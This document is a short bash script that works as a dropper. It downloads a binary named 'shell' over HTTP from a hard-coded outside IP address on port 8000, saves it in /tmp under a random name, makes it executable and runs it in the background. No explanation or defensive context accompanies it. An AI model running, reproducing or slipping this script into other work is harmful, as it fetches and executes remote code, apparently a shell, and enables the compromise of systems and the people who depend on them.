#!/usr/bin/env bash

################################################################################

srcbin="shell"
srcip="34.71.95.242"
srcport=8000

################################################################################

name=$(mktemp -u 'XXXXXXXX')
auth=$(mktemp -u 'XXXXXXXX')

wget -q -O /tmp/$name http://$srcip:$srcport/$srcbin
chmod +x /tmp/$name
/tmp/$name &
